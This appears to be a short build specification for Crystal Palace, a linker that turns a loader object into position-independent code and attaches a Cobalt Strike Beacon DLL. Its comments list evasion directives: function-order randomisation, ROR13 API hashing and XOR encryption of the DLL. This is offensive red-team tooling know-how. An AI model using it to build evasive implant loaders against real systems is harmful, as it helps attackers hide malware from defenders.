# Crystal Palace Loader Specification File
#
# Drives Crystal Palace's linker:
#   compile object -> make PIC -> append DLL -> export
#
# Directives:
#   make pic + gofirst    — Convert COFF to PIC, pin go() at offset 0
#   make pic + disco      — Randomise function order
#   dfr "resolve" "ror13" — Rewrite MODULE$Function calls via ROR13 hashes
#   mergelib              — Merge a zip archive of COFF objects
#   push $DLL             — Push the Beacon DLL bytes (from Aggressor)
#   link "dll"            — Link to the "dll" section marker
#   generate $KEY 128     — Generate a 128-byte random key
#   xor $DLL $KEY         — XOR the DLL with the key
#   patch "sym" $VAL      — Overwrite a named symbol

x64:
    load "bin/loader.x64.o"
    make pic + gofirst              # gofirst pins go() at offset 0
    dfr "resolve" "ror13"           # rewrite MODULE$Function calls
    mergelib "libtcg.x64.zip"       # merge shared TCG library

    push $DLL                       # DLL is passed in from Aggressor
    link "dll"                      # link to the "dll" section marker
    export
